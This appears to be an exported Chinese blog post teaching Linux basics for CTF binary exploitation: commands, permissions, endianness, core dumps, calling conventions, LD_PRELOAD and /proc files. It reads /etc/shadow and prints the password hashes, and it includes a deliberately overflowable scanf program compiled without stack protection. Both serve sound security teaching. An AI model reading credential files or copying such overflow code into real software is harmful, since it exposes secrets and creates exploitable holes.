/etc/group\nroot:x:0:root\nbin:x:1:root,bin,daemon\ndaemon:x:2:root,bin,daemon\nsys:x:3:root,bin,firmy\n......\n```\n\n所有用户的信息（除了密码）都保存在 `/etc/passwd` 文件中，而为了安全起见，加密过的用户密码保存在 `/etc/shadow` 文件中，此文件只有 root 权限可以访问。\n\n```\n$ sudo cat /etc/shadow\nroot:$6$root$wvK.pRXFEH80GYkpiu1tEWYMOueo4tZtq7mYnldiyJBZDMe.mKwt.WIJnehb4bhZchL/93Oe1ok9UwxYf79yR1:17264::::::\nfirmy:$6$firmy$dhGT.WP91lnpG5/10GfGdj5L1fFVSoYlxwYHQn.llc5eKOvr7J8nqqGdVFKykMUSDNxix5Vh8zbXIapt0oPd8.:17264:0:99999:7:::\n```\n\n由于普通用户的权限比较低，这里使用 `sudo` 命令可以让普通用户以 root 用户的身份运行某一命令。使用 `su` 命令则可以切换到一个不同的用户：\n\n```\n$ whoami\nfirmy\n$ su root\n# whoami\nroot\n```\n\n`whoami` 用于打印当前有效的用户名称，shell 中普通用户以 `$` 开头，root 用户以 `#` 开头。在输入密码后，我们已经从 firmy 用户转换到 root 用户了。\n\n\n\n## 权限设置\n\n在Linux 中，文件或目录权限的控制分别以读取、写入、执行 3 种一般权限来区分，另有 3 种特殊权限可供运用。\n\n使用 `ls -l [file]` 来查看某文件或目录的信息：\n\n```\n$ ls -l /\nlrwxrwxrwx   1 root root     7 Jun 21 22:44 bin -> usr/bin\ndrwxr-xr-x   4 root root  4096 Jul 28 08:48 boot\n-rw-r--r--   1 root root 18561 Apr  2 22:48 desktopfs-pkgs.txt\n```\n\n第一栏从第二个字母开始就是权限字符串，权限表示三个为一组，依次是所有者权限、组权限、其他人权限。每组的顺序均为 `rwx`，如果有相应权限，则表示成相应字母，如果不具有相应权限，则用 `-` 表示。 - `r`：读取权限，数字代号为 “4” - `w`：写入权限，数字代号为 “2” - `x`：执行或切换权限，数字代号为 “1”\n\n\n\n通过第一栏的第一个字母可知，第一行是一个链接文件 （`l`），第二行是个目录（`d`），第三行是个普通文件（`-`）。\n\n用户可以使用 `chmod` 指令去变更文件与目录的权限。权限范围被指定为所有者（`u`）、所属组（`g`）、其他人（`o`）和所有人（`a`）。 - -R：递归处理，将指令目录下的所有文件及子目录一并处理； - <权限范围>+<权限设置>：开启权限范围的文件或目录的该选项权限设置 - `$ chmod a+r [file]`：赋予所有用户读取权限 - <权限范围>-<权限设置>：关闭权限范围的文件或目录的该选项权限设置 - `$ chmod u-w [file]`：取消所有者写入权限 - <权限范围>=<权限设置>：指定权限范围的文件或目录的该选项权限设置； - `$ chmod g=x [file]`：指定组权限为可执行 - `$ chmod o=rwx [file]`：制定其他人权限为可读、可写和可执行\n\n![img](http://study.ctfcaict.com/media/course/html/3/site/linux/pic/1.3_file.png)\n\n## 字节序\n\n目前计算机中采用两种字节存储机制：大端（Big-endian）和小端（Little-endian）。\n\n> MSB (Most Significan Bit/Byte)：最重要的位或最重要的字节。\n>\n> LSB (Least Significan Bit/Byte)：最不重要的位或最不重要的字节。\n\nBig-endian 规定 MSB 在存储时放在低地址，在传输时放在流的开始；LSB  存储时放在高地址，在传输时放在流的末尾。Little-endian 则相反。常见的 Intel 处理器使用 Little-endian，而  PowerPC 系列处理器则使用 Big-endian，另外 TCP/IP 协议和 Java 虚拟机的字节序也是 Big-endian。\n\n例如十六进制整数 0x12345678 存入以 1000H 开始的内存中：\n\n![img](http://study.ctfcaict.com/media/course/html/3/site/linux/pic/1.3_byte_order.png)\n\n我们在内存中实际地看一下，在地址 `0xffffd584` 处有字符 `1234`，在地址 `0xffffd588` 处有字符 `5678`。\n\n```\ngdb-peda$ x/w 0xffffd584\n0xffffd584:     0x34333231\ngdb-peda$ x/4wb 0xffffd584\n0xffffd584:     0x31    0x32    0x33    0x34\ngdb-peda$ python print('\\x31\\x32\\x33\\x34')\n1234\n\ngdb-peda$ x/w 0xffffd588\n0xffffd588:     0x38373635\ngdb-peda$ x/4wb 0xffffd588\n0xffffd588:     0x35    0x36    0x37    0x38\ngdb-peda$ python print('\\x35\\x36\\x37\\x38')\n5678\n\ngdb-peda$ x/2w 0xffffd584\n0xffffd584:     0x34333231      0x38373635\ngdb-peda$ x/8wb 0xffffd584\n0xffffd584:     0x31    0x32    0x33    0x34    0x35    0x36    0x37    0x38\ngdb-peda$ python print('\\x31\\x32\\x33\\x34\\x35\\x35\\x36\\x37\\x38')\n123455678\ndb-peda$ x/s 0xffffd584\n0xffffd584:     \"12345678\"\n```\n\n\n\n## 输入输出\n\n- 使用命令的输出作为可执行文件的输入参数\n- `$ ./vulnerable 'your_command_here'`\n- `$ ./vulnerable $(your_command_here)`\n- 使用命令作为输入\n- `$ your_command_here | ./vulnerable`\n- 将命令行输出写入文件\n- `$ your_command_here > filename`\n- 使用文件作为输入\n- `$ ./vulnerable < filename`\n\n## 文件描述符\n\n在 Linux 系统中一切皆可以看成是文件，文件又分为：普通文件、目录文件、链接文件和设备文件。文件描述符（file descriptor）是内核管理已被打开的文件所创建的索引，使用一个非负整数来指代被打开的文件。\n\n标准文件描述符如下：\n\n| 文件描述符 | 用途     | stdio 流 |\n| ---------- | -------- | -------- |\n| 0          | 标准输入 | stdin    |\n| 1          | 标准输出 | stdout   |\n| 2          | 标准错误 | stderr   |\n\n当一个程序使用 `fork()` 生成一个子进程后，子进程会继承父进程所打开的文件表，此时，父子进程使用同一个文件表，这可能导致一些安全问题。如果使用 `vfork()`，子进程虽然运行于父进程的空间，但拥有自己的进程表项。\n\n## 核心转储\n\n当程序运行的过程中异常终止或崩溃，操作系统会将程序当时的内存、寄存器状态、堆栈指针、内存管理信息等记录下来，保存在一个文件中，这种行为就叫做核心转储（Core Dump）。\n\n#### 会产生核心转储的信号\n\n| Signal  | Action | Comment                  |\n| ------- | ------ | ------------------------ |\n| SIGQUIT | Core   | Quit from keyboard       |\n| SIGILL  | Core   | Illegal Instruction      |\n| SIGABRT | Core   | Abort signal from abort  |\n| SIGSEGV | Core   | Invalid memory reference |\n| SIGTRAP | Core   | Trace/breakpoint trap    |\n\n#### 开启核心转储\n\n- 输入命令 `ulimit -c`，输出结果为 `0`，说明默认是关闭的。\n\n- 输入命令 `ulimit -c unlimited` 即可在当前终端开启核心转储功能。\n\n- 如果想让核心转储功能永久开启，可以修改文件 \n\n  ```\n  /etc/security/limits.conf\n  ```\n\n  ，增加一行：  \n\n  ```\n  #<domain>      <type>  <item>         <value>\n  *               soft    core            unlimited\n  ```\n\n#### 修改转储文件保存路径\n\n- ```\n  /proc/sys/kernel/core_uses_pid\n  ```\n\n  ，可以使生成的核心转储文件名变为 \n\n  ```\n  core.[pid]\n  ```\n\n   的模式。  \n\n  ```\n  # echo 1 > /proc/sys/kernel/core_uses_pid\n  ```\n\n- 还可以修改 \n\n  ```\n  /proc/sys/kernel/core_pattern\n  ```\n\n   来控制生成核心转储文件的保存位置和文件名格式。  \n\n  ```\n  # echo /tmp/core-%e-%p-%t > /proc/sys/kernel/core_pattern\n  ```\n\n    此时生成的文件保存在 \n\n  ```\n  /tmp/\n  ```\n\n   目录下，文件名格式为 \n\n  ```\n  core-[filename]-[pid]-[time]\n  ```\n\n#### 使用 gdb 调试核心转储文件\n\n```\n$ gdb [filename] [core file]\n```\n\n#### 例子\n\n```\n$ cat core.c\n#include <stdio.h>\nvoid main(int argc, char **argv) {\n    char buf[5];\n    scanf(\"%s\", buf);\n}\n$ gcc -m32 -fno-stack-protector core.c\n$ ./a.out\nAAAAAAAAAAAAAAAAAAAA\nSegmentation fault (core dumped)\n$ file /tmp/core-a.out-12444-1503198911\n/tmp/core-a.out-12444-1503198911: ELF 32-bit LSB core file Intel 80386, version 1 (SYSV), SVR4-style, from './a.out', real uid: 1000, effective uid: 1000, real gid: 1000, effective gid: 1000, execfn: './a.out', platform: 'i686'\n$ gdb a.out /tmp/core-a.out-12444-1503198911 -q\nReading symbols from a.out...(no debugging symbols found)...done.\n[New LWP 12444]\nCore was generated by `./a.out'.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0x5655559b in main ()\ngdb-peda$ info frame\nStack level 0, frame at 0x41414141:\n eip = 0x5655559b in main; saved eip = <not saved>\n Outermost frame: Cannot access memory at address 0x4141413d\n Arglist at 0x41414141, args:\n Locals at 0x41414141, Previous frame's sp is 0x41414141\nCannot access memory at address 0x4141413d\n```\n\n## 调用约定\n\n函数调用约定是对函数调用时如何传递参数的一种约定。关于它的约定有许多种，下面我们分别从内核接口和用户接口介绍 32 位和 64 位 Linux 的调用约定。\n\n#### 内核接口\n\n**x86-32 系统调用约定**：Linux 系统调用使用寄存器传递参数。`eax` 为 syscall_number，`ebx`、`ecx`、`edx`、`esi`、`ebp` 用于将 6 个参数传递给系统调用。返回值保存在 `eax` 中。所有其他寄存器（包括 EFLAGS）都保留在 `int 0x80` 中。\n\n**x86-64 系统调用约定**：内核接口使用的寄存器有：`rdi`、`rsi`、`rdx`、`r10`、`r8`、`r9`。系统调用通过 `syscall` 指令完成。除了 `rcx`、`r11` 和 `rax`，其他的寄存器都被保留。系统调用的编号必须在寄存器 `rax` 中传递。系统调用的参数限制为 6 个，不直接从堆栈上传递任何参数。返回时，`rax` 中包含了系统调用的结果。而且只有 INTEGER 或者 MEMORY 类型的值才会被传递给内核。\n\n#### 用户接口\n\n**x86-32 函数调用约定**：参数通过栈进行传递。最后一个参数第一个被放入栈中，直到所有的参数都放置完毕，然后执行 call 指令。这也是 Linux 上 C 语言函数的方式。\n\n**x86-64 函数调用约定**：x86-64 下通过寄存器传递参数，这样做比通过栈有更高的效率。它避免了内存中参数的存取和额外的指令。根据参数类型的不同，会使用寄存器或传参方式。如果参数的类型是 MEMORY，则在栈上传递参数。如果类型是 INTEGER，则顺序使用 `rdi`、`rsi`、`rdx`、`rcx`、`r8` 和 `r9`。所以如果有多于 6 个的 INTEGER 参数，则后面的参数在栈上传递。\n\n## 环境变量\n\n- 按照生命周期划分\n- 永久环境变量：修改相关配置文件，永久生效。\n- 临时环境变量：使用 `export` 命令，在当前终端下生效，关闭终端后失效。\n- 按照作用域划分\n- 系统环境变量：对该系统中所有用户生效。\n- 用户环境变量：对特定用户生效。\n\n#### 设置方法\n\n1. 在文件 `/etc/profile` 中添加变量，这种方法对所有用户永久生效。如：\n\n   ```\n   # Set our default path\n   PATH=\"/usr/local/sbin:/usr/local/bin:/usr/bin\"\n   export PATH\n   ```\n\n   添加后执行命令 \n\n   ```\n   source /etc/profile\n   ```\n\n    使其生效。\n\n   \n\n2. 在文件 `~/.bash_profile` 中添加变量，这种方法对当前用户永久生效。其余同上。\n\n3. 直接运行命令 `export` 定义变量，这种方法只对当前终端临时生效。\n\n#### 常用变量\n\n使用命令 `echo` 打印变量：\n\n```\n$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl\n$ echo $HOME\n/home/firmy\n$ echo $LOGNAME\nfirmy\n$ echo $HOSTNAME\nfirmy-pc\n$ echo $SHELL\n/bin/bash\n$ echo $LANG\nen_US.UTF-8\n```\n\n使用命令 `env` 可以打印出所有环境变量：\n\n```\n$ env\n```\n\n使用命令 `set` 可以打印处所有本地定义的 shell 变量：\n\n```\n$ set\n```\n\n使用命令 `unset` 可以清楚环境变量：\n\n```\n$ unset $变量名\n```\n\n\n\n#### LD_PRELOAD\n\n该环境变量可以定义在程序运行前优先加载的动态链接库。在 pwn 题目中，我们可能需要一个特定的 libc，这时就可以定义该变量：\n\n```\n$ LD_PRELOAD=/path/to/libc.so ./binary\n```\n\n一个例子：\n\n```\n$ ldd /bin/true\n    linux-vdso.so.1 =>  (0x00007fff9a9fe000)\n    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1c083d9000)\n    /lib64/ld-linux-x86-64.so.2 (0x0000557bcce6c000)\n$ LD_PRELOAD=~/libc.so.6 ldd /bin/true\n    linux-vdso.so.1 =>  (0x00007ffee55e9000)\n    /home/firmy/libc.so.6 (0x00007f4a28cfc000)\n    /lib64/ld-linux-x86-64.so.2 (0x000055f33bc50000)\n```\n\n\n\n注意，这种方法得根据实际情况来用，大概就是使用的发行版要相同（`interpreter` 相同），上面的例子中两个 libc 是这样的：\n\n```\n$ file /lib/x86_64-linux-gnu/libc-2.23.so\n/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped\n$ file ~/libc.so.6\n/home/firmy/libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped\n```\n\n都是 `interpreter /lib64/ld-linux-x86-64.so.2`，所以可以替换。\n\n\n\n而下面的例子是在 Arch Linux 上使用一个 Ubuntu 的 libc，就会出错：\n\n```\n$ ldd /bin/true\n        linux-vdso.so.1 (0x00007ffc969df000)\n        libc.so.6 => /usr/lib/libc.so.6 (0x00007f7ddde17000)\n        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f7dde3d7000)\n$ LD_PRELOAD=~/libc.so.6 ldd /bin/true\nIllegal instruction (core dumped)\n$ file /usr/lib/libc-2.26.so\n/usr/lib/libc-2.26.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /usr/lib/ld-linux-x86-64.so.2, BuildID[sha1]=458fd9997a454786f071cfe2beb234542c1e871f, for GNU/Linux 3.2.0, not stripped\n$ file ~/libc.so.6\n/home/firmy/libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped\n```\n\n一个在 `interpreter /usr/lib/ld-linux-x86-64.so.2`，而另一个在 `interpreter /lib64/ld-linux-x86-64.so.2`。\n\n\n\n## /proc/pid\n\nproc 文件系统是 Linux 内核提供的，为访问系统内核数据的操作提供接口。在该文件系统下，有一些以数字命名的目录，这些数字是进程的 PID 号，而这些目录是进程目录。\n\n目录下的所有文件如下，然后会介绍几个比较重要的：\n\n```\n$ cat - &\n[1] 2865\n$ ls /proc/2865/\nattr             cpuset   limits      ns             root          statm\nautogroup        cwd      map_files   numa_maps      sched         status\nauxv             environ  maps        oom_adj        schedstat     syscall\ncgroup           exe      mem         oom_score      setgroups     task\nclear_refs       fd       mountinfo   oom_score_adj  smaps         timers\ncmdline          fdinfo   mounts      pagemap        smaps_rollup  timerslack_ns\ncomm             gid_map  mountstats  personality    stack         uid_map\ncoredump_filter  io       net         projid_map     stat          wchan\n\n[1]+  Stopped                 cat -\n```\n\n\n\n#### /proc/[pid]/maps\n\n这个文件大概是最常用的，用于显示进程的内存区域映射信息：\n\n```\n$ cat /proc/2865/maps\n5580631c6000-5580631ce000 r-xp 00000000 08:01 4981196                    /usr/bin/cat\n5580633cd000-5580633ce000 r--p 00007000 08:01 4981196                    /usr/bin/cat\n5580633ce000-5580633cf000 rw-p 00008000 08:01 4981196                    /usr/bin/cat\n558063c7d000-558063c9e000 rw-p 00000000 00:00 0                          [heap]\n7f6301cd7000-7f6302027000 r--p 00000000 08:01 4993768                    /usr/lib/locale/locale-archive\n7f6302027000-7f63021d5000 r-xp 00000000 08:01 4982395                    /usr/lib/libc-2.26.so\n7f63021d5000-7f63023d5000 ---p 001ae000 08:01 4982395                    /usr/lib/libc-2.26.so\n7f63023d5000-7f63023d9000 r--p 001ae000 08:01 4982395                    /usr/lib/libc-2.26.so\n7f63023d9000-7f63023db000 rw-p 001b2000 08:01 4982395                    /usr/lib/libc-2.26.so\n7f63023db000-7f63023df000 rw-p 00000000 00:00 0\n7f63023df000-7f6302404000 r-xp 00000000 08:01 4982398                    /usr/lib/ld-2.26.so\n7f63025c1000-7f63025c3000 rw-p 00000000 00:00 0\n7f63025e1000-7f6302603000 rw-p 00000000 00:00 0\n7f6302603000-7f6302604000 r--p 00024000 08:01 4982398                    /usr/lib/ld-2.26.so\n7f6302604000-7f6302605000 rw-p 00025000 08:01 4982398                    /usr/lib/ld-2.26.so\n7f6302605000-7f6302606000 rw-p 00000000 00:00 0\n7fff2ab81000-7fff2aba2000 rw-p 00000000 00:00 0                          [stack]\n7fff2abef000-7fff2abf2000 r--p 00000000 00:00 0                          [vvar]\n7fff2abf2000-7fff2abf4000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n```\n\n\n\n#### /proc/[pid]/stack\n\n这个文件表示当前进程的内核调用栈信息：\n\n```\n$ sudo cat /proc/2865/stack\n[<ffffffffa008d05e>] do_signal_stop+0xae/0x1f0\n[<ffffffffa008e50c>] get_signal+0x18c/0x5a0\n[<ffffffffa002ac26>] do_signal+0x36/0x610\n[<ffffffffa0003019>] exit_to_usermode_loop+0x69/0xa0\n[<ffffffffa00038eb>] syscall_return_slowpath+0x9b/0xb0\n[<ffffffffa06926e4>] entry_SYSCALL_64_fastpath+0x7b/0x7d\n[<ffffffffffffffff>] 0xffffffffffffffff\n```\n\n\n\n#### /proc/[pid]/auxv\n\n该文件包含了传递给进程的解释器信息，即 auxv(AUXiliary Vector)，每一项都是由一个 unsigned long 长度的 ID 加上一个 unsigned long 长度的值构成：\n\n```\n$ xxd -e -g8 /proc/2865/auxv\n00000000: 0000000000000021 00007fff2abf2000  !........ .*....\n00000010: 0000000000000010 00000000bfebfbff  ................\n00000020: 0000000000000006 0000000000001000  ................\n00000030: 0000000000000011 0000000000000064  ........d.......\n00000040: 0000000000000003 00005580631c6040  ........@`.c.U..\n00000050: 0000000000000004 0000000000000038  ........8.......\n00000060: 0000000000000005 0000000000000009  ................\n00000070: 0000000000000007 00007f63023df000  ..........=.c...\n00000080: 0000000000000008 0000000000000000  ................\n00000090: 0000000000000009 00005580631c8290  ...........c.U..\n000000a0: 000000000000000b 00000000000003e8  ................\n000000b0: 000000000000000c 00000000000003e8  ................\n000000c0: 000000000000000d 00000000000003e8  ................\n000000d0: 000000000000000e 00000000000003e8  ................\n000000e0: 0000000000000017 0000000000000000  ................\n000000f0: 0000000000000019 00007fff2ab9ff39  ........9..*....\n00000100: 000000000000001a 0000000000000000  ................\n00000110: 000000000000001f 00007fff2aba1feb  ...........*....\n00000120: 000000000000000f 00007fff2ab9ff49  ........I..*....\n00000130: 0000000000000000 0000000000000000  ................\n```\n\n每个值具体是做什么的，可以用下面的办法显示出来，对比看一看，更详细的可以查看 `/usr/include/elf.h` 和 `man ld.so`：\n\n```\n$ LD_SHOW_AUXV=1 cat -\nAT_SYSINFO_EHDR: 0x7fff6afb3000\nAT_HWCAP:        bfebfbff\nAT_PAGESZ:       4096\nAT_CLKTCK:       100\nAT_PHDR:         0x557b68217040\nAT_PHENT:        56\nAT_PHNUM:        9\nAT_BASE:         0x7f41e5689000\nAT_FLAGS:        0x0\nAT_ENTRY:        0x557b68219290\nAT_UID:          1000\nAT_EUID:         1000\nAT_GID:          1000\nAT_EGID:         1000\nAT_SECURE:       0\nAT_RANDOM:       0x7fff6aedc0a9\nAT_HWCAP2:       0x0\nAT_EXECFN:       /usr/bin/cat\nAT_PLATFORM:     x86_64\n```\n\n值得一提的是，`AT_SYSINFO_EHDR` 所对应的值是一个叫做的 VDSO(Virtual Dynamic Shared Object) 的地址。在 ret2vdso 漏洞利用方法中会用到（参考章节6.1.6）。\n\n\n\n#### /proc/[pid]/environ\n\n该文件包含了进程的环境变量：\n\n```\n$ strings /proc/2865/environ\n```\n\n\n\n#### /proc/[pid]/fd\n\n该文件包含了进程打开文件的情况：\n\n```\n$ ls -al /proc/2865/fd\ntotal 0\ndr-x------ 2 firmy firmy  0 12月 30 11:13 .\ndr-xr-xr-x 9 firmy firmy  0 12月 30 11:13 ..\nlrwx------ 1 firmy firmy 64 12月 30 12:31 0 -> /dev/pts/2\nlrwx------ 1 firmy firmy 64 12月 30 12:31 1 -> /dev/pts/2\nlrwx------ 1 firmy firmy 64 12月 30 12:31 2 -> /dev/pts/2\n```\n\n\n\n#### /proc/[pid]/status[¶](http://study.ctfcaict.com/media/course/html/3/863846a6-3305-4770-9bb5-ecaa12171a2e.html#procpidstatus)\n\n该文件包含了进程的状态信息：\n\n```\n$ cat /proc/2865/status\nName:   cat\nUmask:  0022\nState:  T (stopped)\nTgid:   2865\nNgid:   0\nPid:    2865\nPPid:   2059\nTracerPid:      0\nUid:    1000    1000    1000    1000\nGid:    1000    1000    1000    1000\nFDSize: 256\nGroups: 3 7 10 56 90 91 93 95 96 98 1000\nNStgid: 2865\nNSpid:  2865\nNSpgid: 2865\nNSsid:  2059\nVmPeak:     7828 kB\nVmSize:     7828 kB\nVmLck:         0 kB\nVmPin:         0 kB\nVmHWM:       788 kB\nVmRSS:       788 kB\nRssAnon:              64 kB\nRssFile:             724 kB\nRssShmem:              0 kB\nVmData:      312 kB\nVmStk:       132 kB\nVmExe:        32 kB\nVmLib:      1876 kB\nVmPTE:        40 kB\nVmPMD:        12 kB\nVmSwap:        0 kB\nHugetlbPages:          0 kB\nThreads:        1\nSigQ:   2/47723\nSigPnd: 0000000000000000\nShdPnd: 0000000000000000\nSigBlk: 0000000000000000\nSigIgn: 0000000000000000\nSigCgt: 0000000000000000\nCapInh: 0000000000000000\nCapPrm: 0000000000000000\nCapEff: 0000000000000000\nCapBnd: 0000003fffffffff\nCapAmb: 0000000000000000\nNoNewPrivs:     0\nSeccomp:        0\nCpus_allowed:   ff\nCpus_allowed_list:      0-7\nMems_allowed:   00000001\nMems_allowed_list:      0\nvoluntary_ctxt_switches:        1\nnonvoluntary_ctxt_switches:     0\n```\n\n#### /proc/[pid]/syscall\n\n该文件包含了进程正在执行的系统调用：\n\n```\n$ sudo cat /proc/2865/syscall\n0 0x0 0x7f63025e2000 0x20000 0x22 0xffffffffffffffff 0x0 0x7fff2ab9f958 0x7f630210ea11\n```\n\n第一个值是系统调用号，后面跟着是六个参数，最后两个值分别是堆栈指针和指令计数器的值。","source":"_posts/linux1.md","raw":"# Linux快速入门\n\n## 常用基础命令\n\n```\nls                  用来显示目标列表\n\ncd [path]           用来切换工作目录\n\npwd                 以绝对路径的方式显示用户当前工作目录\n\nman [command]       查看Linux中的指令帮助、配置文件帮助和编程帮助等信息\n\napropos [whatever]  在一些特定的包含系统命令的简短描述的数据库文件里查找关键字\n\necho [string]       打印一行文本，参数“-e”可激活转义字符\n\ncat [file]          连接文件并打印到标准输出设备上\n\nless [file]         允许用户向前或向后浏览文字档案的内容\n\nmv [file1] [file2]  用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中\n\ncp [file1] [file2]  用来将一个或多个源文件或者目录复制到指定的目的文件或目录\n\nrm [file]           可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉\n\nps                  用于报告当前系统的进程状态\n\ntop                 实时查看系统的整体运行情况\n\nkill                杀死一个进程\n\nifconfig            查看或设置网络设备\n\nping                查看网络上的主机是否工作\n\nnetstat             显示网络连接、路由表和网络接口信息\n\nnc(netcat)          建立 TCP 和 UDP 连接并监听\n\nsu                  切换当前用户身份到其他用户身份\n\ntouch [file]        创建新的空文件\n\nmkdir [dir]         创建目录\n\nchmod               变更文件或目录的权限\n\nchown               变更某个文件或目录的所有者和所属组\n\nnano / vim / emacs  字符终端的文本编辑器\n\nexit                退出 shell\n管道命令符 \"|\"       将一个命令的标准输出作为另一个命令的标准输入\n```\n\n使用变量：\n\n```\nvar=value         给变量var赋值value\n\n$var, ${var}      取变量的值\n\n`cmd`, $(cmd)     代换标准输出\n\n'string'          非替换字符串\n\n\"string\"          可替换字符串        \n$ var=\"test\";\n$ echo $var\ntest\n$ echo 'This is a $var';\nThis is a $var\n$ echo \"This is a $var\";\nThis is a test\n\n$ echo `date`;\n2017年 11月 06日 星期一 14:40:07 CST\n$ $(bash)\n\n$ echo $0\n/bin/bash\n$ $($0)\n```\n\n\n\n## Bash 快捷键\n\n```\nUp(Down)          上（下）一条指令\n\nCtrl + c          终止当前进程\n\nCtrl + z          挂起当前进程，使用“fg”可唤醒\n\nCtrl + d          删除光标处的字符\n\nCtrl + l          清屏\n\nCtrl + a          移动到命令行首\n\nCtrl + e          移动到命令行尾\n\nCtrl + b          按单词后移（向左）\n\nCtrl + f          按单词前移（向右）\n\nCtrl + Shift + c  复制\n\nCtrl + Shift + v  粘贴\n```\n\n## 根目录结构\n\n\n\n```\n$ uname -a\nLinux manjaro 4.11.5-1-ARCH #1 SMP PREEMPT Wed Jun 14 16:19:27 CEST 2017 x86_64 GNU/Linux\n$ ls -al /\ndrwxr-xr-x  17 root root  4096 Jun 28 20:17 .\ndrwxr-xr-x  17 root root  4096 Jun 28 20:17 ..\nlrwxrwxrwx   1 root root     7 Jun 21 22:44 bin -> usr/bin\ndrwxr-xr-x   4 root root  4096 Aug 10 22:50 boot\ndrwxr-xr-x  20 root root  3140 Aug 11 11:43 dev\ndrwxr-xr-x 101 root root  4096 Aug 14 13:54 etc\ndrwxr-xr-x   3 root root  4096 Apr  8 19:59 home\nlrwxrwxrwx   1 root root     7 Jun 21 22:44 lib -> usr/lib\nlrwxrwxrwx   1 root root     7 Jun 21 22:44 lib64 -> usr/lib\ndrwx------   2 root root 16384 Apr  8 19:55 lost+found\ndrwxr-xr-x   2 root root  4096 Oct  1  2015 mnt\ndrwxr-xr-x  15 root root  4096 Jul 15 20:10 opt\ndr-xr-xr-x 267 root root     0 Aug  3 09:41 proc\ndrwxr-x---   9 root root  4096 Jul 22 22:59 root\ndrwxr-xr-x  26 root root   660 Aug 14 21:08 run\nlrwxrwxrwx   1 root root     7 Jun 21 22:44 sbin -> usr/bin\ndrwxr-xr-x   4 root root  4096 May 28 22:07 srv\ndr-xr-xr-x  13 root root     0 Aug  3 09:41 sys\ndrwxrwxrwt  36 root root  1060 Aug 14 21:27 tmp\ndrwxr-xr-x  11 root root  4096 Aug 14 13:54 usr\ndrwxr-xr-x  12 root root  4096 Jun 28 20:17 var\n```\n\n由于不同的发行版会有略微的不同，我们这里使用的是基于 Arch 的发行版 Manjaro，以上就是根目录下的内容，我们介绍几个重要的目录： - `/bin`、`/sbin`：链接到 `/usr/bin`，存放 Linux 一些核心的二进制文件，其包含的命令可在 shell 上运行。 - `/boot`：操作系统启动时要用到的程序。 - `/dev`：包含了所有 Linux 系统中使用的外部设备。需要注意的是这里并不是存放外部设备的驱动程序，而是一个访问这些设备的端口。 - `/etc`：存放系统管理时要用到的各种配置文件和子目录。 - `/etc/rc.d`：存放 Linux 启动和关闭时要用到的脚本。 - `/home`：普通用户的主目录。 - `/lib`、`/lib64`：链接到 `/usr/lib`，存放系统及软件需要的动态链接共享库。 - `/mnt`：这个目录让用户可以临时挂载其他的文件系统。 - `/proc`：虚拟的目录，是系统内存的映射。可直接访问这个目录来获取系统信息。 - `/root`：系统管理员的主目录。 - `/srv`：存放一些服务启动之后需要提取的数据。 - `/sys`：该目录下安装了一个文件系统 sysfs。该文件系统是内核设备树的一个直观反映。当一个内核对象被创建时，对应的文件和目录也在内核对象子系统中被创建。 - `/tmp`：公用的临时文件存放目录。 - `/usr`：应用程序和文件几乎都在这个目录下。 - `/usr/src`：内核源代码的存放目录。 - `/var`：存放了很多服务的日志信息。\n\n\n\n## 进程管理\n\n- top\n- 可以实时动态地查看系统的整体运行情况。\n- ps\n- 用于报告当前系统的进程状态。可以搭配 kill 指令随时中断、删除不必要的程序。\n- 查看某进程的状态：`$ ps -aux | grep [file]`，其中返回内容最左边的数字为进程号（PID）。\n- kill\n- 用来删除执行中的程序或工作。\n- 删除进程某 PID 指定的进程：`$ kill [PID]`\n\n## UID 和 GID\n\nLinux 是一个支持多用户的操作系统，每个用户都有 User ID(UID) 和 Group ID(GID)，UID  是对一个用户的单一身份标识，而 GID 则对应多个 UID。知道某个用户的 UID 和 GID 是非常有用的，一些程序可能就需要 UID/GID 来运行。可以使用 `id` 命令来查看：\n\n```\n$ id root\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log)\n$ id firmy\nuid=1000(firmy) gid=1000(firmy) groups=1000(firmy),3(sys),7(lp),10(wheel),90(network),91(video),93(optical),95(storage),96(scanner),98(power),56(bumblebee)\n```\n\nUID 为 0 的 root 用户类似于系统管理员，它具有系统的完全访问权。我自己新建的用户 firmy，其 UID 为 1000，是一个普通用户。GID 的关系存储在 `/etc/group` 文件中：\n\n```\n$ cat /etc/group\nroot:x:0:root\nbin:x:1:root,bin,daemon\ndaemon:x:2:root,bin,daemon\nsys:x:3:root,bin,firmy\n......\n```\n\n所有用户的信息（除了密码）都保存在 `/etc/passwd` 文件中，而为了安全起见，加密过的用户密码保存在 `/etc/shadow` 文件中，此文件只有 root 权限可以访问。\n\n```\n$ sudo cat /etc/shadow\nroot:$6$root$wvK.pRXFEH80GYkpiu1tEWYMOueo4tZtq7mYnldiyJBZDMe.mKwt.WIJnehb4bhZchL/93Oe1ok9UwxYf79yR1:17264::::::\nfirmy:$6$firmy$dhGT.WP91lnpG5/10GfGdj5L1fFVSoYlxwYHQn.llc5eKOvr7J8nqqGdVFKykMUSDNxix5Vh8zbXIapt0oPd8.:17264:0:99999:7:::\n```\n\n由于普通用户的权限比较低，这里使用 `sudo` 命令可以让普通用户以 root 用户的身份运行某一命令。使用 `su` 